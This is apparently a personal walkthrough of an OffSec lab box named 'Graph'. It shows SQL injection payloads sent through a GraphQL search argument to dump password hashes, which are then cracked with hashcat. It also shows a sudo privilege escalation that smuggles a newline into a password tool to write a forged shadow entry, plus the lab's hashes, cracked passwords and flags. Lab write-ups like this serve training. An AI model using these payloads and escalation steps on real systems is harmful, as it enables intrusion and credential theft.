---
box_name: "Graph"
author: "James Heringer"
platform: "Offsec"
date: 2025-10-11
tags: [SQLi]
difficulty: "easy"
---

# Graph
- **192.168.168.201**
## TLDR Summary
1. This lab sucks.  It's way easier using Altair, step 6
2. Decent graphql walkthrough here : https://youtu.be/04ZBIioD5pA?t=5715
3. Enumeration should be able to find the that graphql services is running  on port 80
4. Custom seclist for graphql here : `/usr/share/seclists/Discovery/Web-Content/graphql.txt `
5. If you have custom graphql INQL tool, you can walk the schema and find a users table to enumerate
6. Enumerate with this tool : https://github.com/altair-graphql/altair/releases 
7. Walk graphql, to identify users table with password  hashes
8. This table has 3 users, with hashes. Jane is user that cracks
9. Login with jane via ssh
10. Read email, it  references script pass-gen
11. pass-gen source code indicates vulnerability, where it doesn't strip trailing new line \n
12. sudo -l shows we can run pass-gen as root
13. Use pass-gen to write new password entry for user josh
14. Josh is member of shadow users, so he  can read shadow file to get root password
15. SSH back in as josh
16. read /etc/shadow file, grab roots password, crack with hashcat, get flag
## Enum
```bash
sudo nmap -Pn -p- -T4 192.168.168.201  --reason                  
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61


sudo nmap -Pn -p 22,80 -T4 192.168.168.201 -sC -sV 
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Node.js Express framework
|_http-title: Welcome at Graph!

# whatweb enumeration 
whatweb -v http://192.168.168.201                              
Title     : Welcome at Graph!

feroxbuster -u  http://192.168.168.201 -k --silent

# specialized graphql wordlist 
feroxbuster -u  http://192.168.168.201 -k --silent -w /usr/share/seclists/Discovery/Web-Content/graphql.txt 


```

- so this is a graphql application
- it has an API endpoint at /graphql, that you can craft queries to   send to 
```bash
curl -X POST 'https://api.example.com/graphql' \
  -H 'Content-Type: application/json' \
  -d '{"query": "query GetUser { user(id: \"1\") { id name } }"}'
  
  curl -X POST  'http://192.168.168.201/graphql' \
  -H 'Content-Type: application/json' \
  -d '{"query": "query GetUser { user(id: \"1\") { id name } }"}'
  
```
- seclists has an smallish API endpoint file here : /usr/share/seclists/Discovery/Web-Content/api/ api-endpoints.txt
- A larger list  is   api-endpoints-res.txt  
```bash
 gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern 
```
- Graphql api isn't the way,  its a very cusom thing
```bash
curl -X GET 'http://192.168.168.201/graphql?query=query+cop+%7B__typename%7D' \
  -x http://127.0.0.1:8080

# forwarded through BURP, and sent to repeater, lets add some ERRORS!
GET /graphql?query='query+cop+%7B__typename%7D HTTP/1.1

Syntax Error: Unexpected single quote character (

```
## Altair  enum graphql 
1. Enumerate with this tool : https://github.com/altair-graphql/altair/releases 
2. Launch altair at `/opt/Altair GraphQL Client/altair`
3. Change to GET, use URL :  http://192.168.168.201/graphql/
4. Right side you can use syntax to 'add to query' automatically
5. Generic query will query users: ` users(searchTerm: "admin") `
6. We are going to modify query, introducing SQLi UNION  select
7. Change query to order by `users(searchTerm: "' ORDER BY 6-- -'")`
8. This query returns all users `users(searchTerm: "' ORDER BY 1-- -'")`
9. Query Table structure ` users(searchTerm: "' UNION SELECT sql FROM sqlite_master WHERE type='table';-- -'")`
10. The table query exposes a password_hash column
11. Grab password_hash ` users(searchTerm: "' UNION SELECT password_hash FROM users -- -'")`
12. We can also concatenate with || in our query : `  users(searchTerm: "' UNION SELECT username || password_hash FROM users -- -'") `
13. We now have password hash for  user jane, 
## CREDS
```bash
admin:$6$PRyGjElQ$unCSC/NlXu2KsYEjc1RuIqduAnPpPEwGg5diM4mZZbzhEWIWjhvlaoROBf5UgLWUFUFiEXSBjBmVENBbHO5oK/
jane:$6$4BlcfbYDsQp3BMG$vwPo.Fpjadmz2jqPFPxrNusB8zCM2TBnNU1HuwkO9vWWvt3jFbpJ0ymelX/fyNgoLW9vQ/fJI0mL8vqw96HMX.
josh:$6$g744Ii0AvY$Oce4aPVtE96encnfV5q1MboCBHyz74qw0R6d/iZKxIrHSFUtG3z7LfbAfHu1aoYRgbseH0tG3.nyGZ9qX1Ean.

echo '$6$4BlcfbYDsQp3BMG$vwPo.Fpjadmz2jqPFPxrNusB8zCM2TBnNU1HuwkO9vWWvt3jFbpJ0ymelX/fyNgoLW9vQ/fJI0mL8vqw96HMX.'  > hash.txt
hashid hash.txt 
[+] SHA-512 Crypt 

hashcat -m 1800 -a 0 hash.txt ~/pwk/rockyou.txt --force -o cracked
cat cracked
$6$4BlcfbYDsQp3BMG$vwPo.Fpjadmz2jqPFPxrNusB8zCM2TBnNU1HuwkO9vWWvt3jFbpJ0ymelX/fyNgoLW9vQ/fJI0mL8vqw96HMX.:oakland

# can also use show
hashcat -m 1800 -a 0 hash.txt  --show

jane:oakland
```

## SSH
```bash
# jane:oakland
ssh jane@192.168.168.201 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"  -p 22

# logged in, I have mail!  Lets check it
# There's no mail program, but I located Janes mail directory /var/mail/jane
cat /var/mail/jane
====================
From: root <root@graph>
To: jane@graph
Subject: Password updater
Message-ID: <20220307204209.GA15027@graph>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.9.4 (2018-02-28)

Mon Mar  7 20:42:09 UTC 2022

Hey, you can find the password updater script we talked about earlier in my home directory. Looking forward to your feedback!
=================================

/home/jane/src/password_manager.py

jane@graph:~$ cat  /etc/passwd |  grep -i sh
root:x:0:0:root:/root:/bin/bash
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
jane:x:1000:1000::/home/jane:/bin/bash
josh:x:1001:1001::/home/josh:/bin/bash
node:x:1002:1002::/home/node:/bin/sh


```

## Priv Esc
```bash
# find writable  files
find / -writable -type d 2>/dev/null


sudo -l
User jane may run the following commands on graph:
    (ALL : ALL) /usr/local/bin/pass-gen

ls -al /usr/local/bin/pass-gen 
-rwxr-xr-x 1 root root 1648 May 17  2022 /usr/local/bin/pass-gen

# god this box is dumb
# so from reading this file, we are supposed to  identify that it doesn't check for \n characters, allowing us to use it to insert another 'josh', who  is in shadow group, into the shadow file with a password of  our choice

mkpasswd -m sha512crypt password123

$6$xA4CCC7YQzDl40A$3lCVdpI59TEDZRqIKdFWB4daOmFq3FSgESYnhDNpiZRlitXs17G.HFKXmq2eMkoWJLC0xGPL2DRxJXupo/Orf1

sudo pass-gen '1337:7:::

josh:$6$xA4CCC7YQzDl40A$3lCVdpI59TEDZRqIKdFWB4daOmFq3FSgESYnhDNpiZRlitXs17G.HFKXmq2eMkoWJLC0xGPL2DRxJXupo/Orf1:19078:0:99999'

ane@graph:~/src$ sudo pass-gen '1337:7:::
> 
> josh:$6$xA4CCC7YQzDl40A$3lCVdpI59TEDZRqIKdFWB4daOmFq3FSgESYnhDNpiZRlitXs17G.HFKXmq2eMkoWJLC0xGPL2DRxJXupo/Orf1:19078:0:99999'

pass-gen: password updated successfully to mkSMeyT!CUz63aX 
# Josh's password is still password123
# login as josh
ssh josh@192.168.168.201 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"  -p 22

# Identify josh in shadow group
grep 'shadow' /etc/group 

# grab ROOTs hash and save to file
echo '$6$4kpaRzOQ$mG9wRaxktdkRgXRVp4tyZkNYub/95YRuZ7P8AybjSGsBCh/0HotsXCq77XI6LOcZfn.lxIzc4NOaHvkROXRMa/' hash.txt

# tried cracking with john.. was so slow, switched to hashcat

hashcat -m 1800 -a 0 hash $rockyou --force -o cracked

hashcat -m  0 hash.txt --show    
root : espartaco
```



## FLAGS
local: a8001ba7a0eca8e76337a49f9be8afc8
root: 403f07ce90f385201d824a8f918bc090